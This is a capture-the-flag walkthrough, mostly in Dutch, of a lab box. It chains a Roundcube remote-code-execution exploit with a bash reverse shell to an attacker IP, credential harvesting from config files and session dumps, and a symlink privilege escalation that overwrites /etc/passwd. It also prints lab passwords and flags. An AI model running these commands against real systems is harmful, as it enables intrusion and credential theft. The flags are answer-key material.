
### MACHINE INFORMATION

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Outbound]
└─$ nmap 10.129.137.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 18:56 CEST
Nmap scan report for 10.129.137.151
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Outbound]
└─$ nmap -p22,80 -sCV 10.129.137.151 -vvvv
///

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

///
```

Zoals je hierboven kunt zien krijgen we een url naar waar we naartoe kunnen surfen. Voor op de webpagina te geraken zal je deze eerst moeten toevoegen aan de hosts file. Daarna kan je daar de pagina surfen. Eens dat je op de pagina bent zal je moeten inloggen met de inlogcredentials die je al gekregen hebt van HTB.

![[Pasted image 20250715190316.png]]

Eens dat we zijn ingelogged en je naar de about tab gaat dan kan je zien dat applicatie op Roundcube Webmail 1.16.10 gedraaid wordt. Ik zal nu een exploit gaan zoeken voor deze versie van roundcube. Ik heb hierbij de volgende url gevonden. https://github.com/hakaioffsec/CVE-2025-49113-exploit. Zoals je hieronder zult kunnen zien ben ik niet helemaal de code gaan uitvoeren maar ben ik op het einde een rce gaan gebruiken voor een connectie te maken tussen de listener van mijn eigen machine en de server.

```
┌──(kali㉿kali)-[~/HTB/Outbound/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.31/4444 0>&1'" 
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
PHP Warning:  file_get_contents(http://mail.outbound.htb//?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload): Failed to open stream: HTTP request failed! in /home/kali/HTB/Outbound/CVE-2025-49113-exploit/CVE-2025-49113.php on line 206
Error: Failed to send the file.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                         
listening on [any] 4444 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.137.151] 33840
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ 
```

Nu dat ik ben ingelogged op de serve, ben ik gaan kijken of dat ik in de var folder geen password kan vinden. Zoals je hieronder zult kunnen zien heb ik credentials gevonden voor op mysql te gaan kijken. Je kan dit gaan password gaan zien door het volgende commando te gebruiken.

```
www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ cat config.inc.php
\\\
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Ik ben nu dus een session dump gaan doen door gebruik te maken van de gegevens die we zonet gevonden hebben. 

```
www-data@mail:/var/www/html/roundcube/public_html/roundcube/SQL/mssql$ mysqldump mysqldump -u roundcube -p'RCDBPass2025' -h localhost roundcube session > session_table.sql
```

Als we nu in de .sql file gaan kijken, zullen we zien dat er een hash gedropt is geweest.

```
INSERT INTO `session` VALUES
('6a5ktqih5uca6lj8vrmgh9v0oh','2025-06-08 15:46:40','172.17.0.1','bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7');
/*!40000 ALTER TABLE `session` ENABLE KEYS */;
```

Aangezien dat dit een base64 hash is, zal ik deze gaan decoderen door gebruik te maken van onze handige tool burpsuite 😀. Hieruit komt de volgende relevante informatie uit.

```
;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

![[Pasted image 20250715212406.png]]

Nu dat we het password van de user jacob hebben, kunnen we gaan proberen inloggen op de ssh server.

| Username | Password                         |
| -------- | -------------------------------- |
| jacob    | L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ |
Maar zoals je hieronder zult kunnen zien zal ik niet kunnen inloggen met deze gegevens op de ssh server. Ik zal dus een andere manier moeten zoeken.

```
┌──(kali㉿kali)-[~/HTB/Outbound]
└─$ ssh jacob@10.129.137.151        
jacob@10.129.137.151's password: 
Permission denied, please try again.
jacob@10.129.137.151's password:
```

Ik ben dus gaan zoeken in de roundcube/bin folder en daar heb ik gezien dat er een decrypt.sh scriptje is die dat ik zal kunnen gebruiken voor de hash te decrypten. Ik ben dit dus gaan doen door de hash van hiernet te gaan nemen en gewoon achter het script te zetten.

```
www-data@mail:/var/www/html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
</bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
```

Ik ben hiermee nu gaan proberen inloggen op de ssh server maar weer geen geluk. Ik ben dan gaan proberen inloggen op de roundcoube site en daar kon ik dus wel inloggen met de volgende usercredentials.

| Username | Password     |
| -------- | ------------ |
| jacob    | 595mO8DmwGeD |
Binnen de roundcube site kunnen we zien dat er een mail van uit tyler verstuurd is geweest naar jacob voor het zeggen dat zijn user password veranderd is geweest. Nu zullen we met de volgende user credentials wel kunnen inloggen op de ssh server.

![[Pasted image 20250715214949.png]]

| Username | Password     |
| -------- | ------------ |
| jacob    | gY4Wr3a1evp4 |
```
┌──(kali㉿kali)-[~/HTB/Outbound]
└─$ ssh jacob@outbound.htb  
jacob@outbound.htb's password: 
///
jacob@outbound:~$
```

Nu dat ik heb kunnen inloggen op de ssh server, kan ik de user flag nemen.

User Flag: 3c660c7300039c52008cb7b0274d35e9

```
jacob@outbound:~$ ls
user.txt
jacob@outbound:~$ cat user.txt 
3c660c7300039c52008cb7b0274d35e9
jacob@outbound:~$
```

Nu dat ik de user flag heb ben ik op de ssh connectie gaan kijken of ik geen commando's kon uitvoeren als administrator door het sudo -l commando te gebruiken.

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below
        -d*
```

Ik ben nu op het internet gaan zoeken of dat er hiervoor geen exploit bestaat Ik was normaal niet aan het zoeken naar een github exploit maar meer naar de informatie voor de exploit zelf uittevoeren maar ik ben dan toch een github exploit tegengekomen. https://github.com/BridgerAlderson/CVE-2025-27591-PoC. Ik ben deze eerst gaan downloaden naar mijn eigen machine en daarna heb ik het python script overgezet. Ik zal deze gaan uitvoeren door het volgende commando te gebruiken.

```
jacob@outbound:~$ python3 exploit.py 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Jul 15 20:17:54.142 DEBG Starting up!
Jul 15 20:17:54.142 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752537600: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Copying payload into /etc/passwd via symlink...
[+] Running: cp /tmp/attacker /var/log/below/error_root.log
[*] Attempting to switch to root shell via 'su attacker'...
attacker@outbound:/home/jacob#
```

Root Flag: 34fb4f6f7d9df8fd58a29bd78332fb30

```
attacker@outbound:/home/jacob# whoami
attacker
attacker@outbound:/home/jacob# cd ..
attacker@outbound:/home# ls
jacob  mel  tyler
attacker@outbound:/home# cd ..
attacker@outbound:/# cd root
attacker@outbound:~# ls
root.txt
attacker@outbound:~# cat root.txt
34fb4f6f7d9df8fd58a29bd78332fb30
```

![[Pasted image 20250715222240.png]]